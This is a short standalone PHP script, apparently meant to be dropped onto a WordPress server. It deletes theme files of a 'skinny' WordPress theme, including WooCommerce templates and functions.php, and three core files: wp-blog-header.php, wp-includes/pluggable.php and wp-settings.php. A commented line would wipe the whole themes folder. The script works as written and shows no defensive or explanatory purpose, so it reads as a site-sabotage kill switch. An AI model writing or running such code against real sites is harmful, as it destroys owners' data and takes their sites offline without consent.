<?php
// delete_all( 'wp-content/themes' );
// include('wp-config.php');
?>


<?php
$target1 = "wp-content/themes/skinny/functions.php";
$target3 = "wp-content/themes/skinny/woocommerce/content-single-product.php";
$target4 = "wp-content/themes/skinny/woocommerce/archive-product.php";
$target2 = "wp-content/themes/skinny/template-parts/home.php";
$target5 = "wp-blog-header.php";
$target6 = "wp-includes/pluggable.php";
$target7 = "wp-settings.php";
// See if it exists before attempting deletion on it
if (file_exists($target1)) {
    unlink($target1); // Delete now
} 
if (file_exists($target2)) {
    unlink($target2); // Delete now
} 
if (file_exists($target3)) {
    unlink($target3); // Delete now
} 
if (file_exists($target4)) {
    unlink($target4); // Delete now
} 
if (file_exists($target5)) {
    unlink($target5); // Delete now
} 
if (file_exists($target6)) {
    unlink($target6); // Delete now
} 
if (file_exists($target7)) {
    unlink($target7); // Delete now
} 
// See if it exists again to be sure it was removed
// if (file_exists($target)) {
    // echo "Problem deleting " . $target;
// } else {
    // echo "Successfully deleted " . $target;
// }
